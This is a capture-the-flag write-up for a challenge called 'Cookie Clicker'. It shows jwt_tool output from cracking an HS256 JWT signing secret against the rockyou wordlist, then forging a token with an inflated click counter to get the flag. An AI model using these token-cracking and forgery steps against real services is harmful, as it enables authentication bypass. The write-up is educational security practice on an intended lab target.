# Cookie Clicker

### Challenge
```
Cookie Clicker
25
Cookies are yummy, Can you help me rock this cookie ?

http://ctf.kaf.sh:3020
```

### Recon, Explore and Hits

* Assumption as per the challenge we need to do something with the cookie

* Trying to use this challenge, signing in with `username` we see the `JWT` logo which is obvious. This is also evident in burpsuite request capture.

* General functionality is as follows,
  - Sign in with a username
  - returned a jwt token
  - next page has 1000000 clicks to be made until you get the flag. There is a counter
  - Bruteforcing clicks would be one thing but....
  - When I was performing recon of the JWT tokens I saw that the tokens expire within few seconds. So we need a faster and more efficient approach

* Using `jwt.io` to decode/debug/re-encode the JWT tokens.

* First look using jwt.io gives the token with a counter on it. We could just find a way in editing this to the respective value to fulfil the counters and get the flag.

* JWT.io also helps in identifying that the JWT token is of type `HS256` and signed with `256 bit secret key` --> which is a password we need to crack

* Referring to the GITHUB --> JWT PAYLODS WIKI --> `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-cracker`

* Using the tool to crack the secret key for the jwt token using rockyou dictionary.
```
root@kali:~/jwt_tool# python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY2xpY2tDb3VudGVyIjowLCJpYXQiOjE1NzcyNjM5OTMsImV4cCI6MTU3NzI2NDAyM30.iu_7TpRZL_EU_ZPtNSNjnBNcIUc39ikkV2NtFaPYpX0

   $$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$$$\                  $$\ 
   \__$$ |$$ | $\  $$ |\__$$  __| \__$$  __|                 $$ |
      $$ |$$ |$$$\ $$ |   $$ |       $$ | $$$$$$\   $$$$$$\  $$ |
      $$ |$$ $$ $$\$$ |   $$ |       $$ |$$  __$$\ $$  __$$\ $$ |
$$\   $$ |$$$$  _$$$$ |   $$ |       $$ |$$ /  $$ |$$ /  $$ |$$ |
$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |
\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |
 \______/ \__/     \__|   \__|$$$$$$\__| \______/  \______/ \__|
 Version 1.3.2                \______|                           


=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = HS256
[+] typ = JWT

Token payload values:
[+] username = admin
[+] clickCounter = 0
[+] iat = 1577263993    ==> TIMESTAMP = 2019-12-25 00:53:13 (UTC)
[+] exp = 1577264023    ==> TIMESTAMP = 2019-12-25 00:53:43 (UTC)

Seen timestamps:
[*] iat was seen
[+] exp is later than iat by: 0 days, 0 hours, 0 mins
[-] TOKEN IS EXPIRED!

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 7
Please provide filename for dictionary file.

> /usr/share/wordlists/rockyou.txt

Loading key dictionary...
File loaded: /usr/share/wordlists/rockyou.txt
Testing passwords in dictionary...
[*] Tested 1 million passwords so far

[+] mypinkipod is the CORRECT key!
```

* Yay! we got the secret. Lets test this secret with a new token/new user to ensure this secret is going to be the same. Else we need to automate this process...

* Seems to be a static secret. Super!

```
root@kali:~/jwt_tool# python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkFBQUEiLCJjbGlja0NvdW50ZXIiOjAsImlhdCI6MTU3NzI2NDY2OCwiZXhwIjoxNTc3MjY0Njk4fQ.WCnD6AhEldOB6LycKPSYVXKkQSakCH0Wuy-FClxllBk

   $$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$$$\                  $$\ 
   \__$$ |$$ | $\  $$ |\__$$  __| \__$$  __|                 $$ |
      $$ |$$ |$$$\ $$ |   $$ |       $$ | $$$$$$\   $$$$$$\  $$ |
      $$ |$$ $$ $$\$$ |   $$ |       $$ |$$  __$$\ $$  __$$\ $$ |
$$\   $$ |$$$$  _$$$$ |   $$ |       $$ |$$ /  $$ |$$ /  $$ |$$ |
$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |
\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |
 \______/ \__/     \__|   \__|$$$$$$\__| \______/  \______/ \__|
 Version 1.3.2                \______|                           


=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = HS256
[+] typ = JWT

Token payload values:
[+] username = AAAA
[+] clickCounter = 0
[+] iat = 1577264668    ==> TIMESTAMP = 2019-12-25 01:04:28 (UTC)
[+] exp = 1577264698    ==> TIMESTAMP = 2019-12-25 01:04:58 (UTC)

Seen timestamps:
[*] iat was seen
[+] exp is later than iat by: 0 days, 0 hours, 0 mins
[-] TOKEN IS EXPIRED!

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 5
Type in the key to test
> mypinkipod

[+] mypinkipod is the CORRECT key!
```

* Ok, now we use this `secret` + `jwt.io` + `create new user and get token` + `alter the counter value to 999999` --> Use the generated token on the request. 

* We get the FLAG!.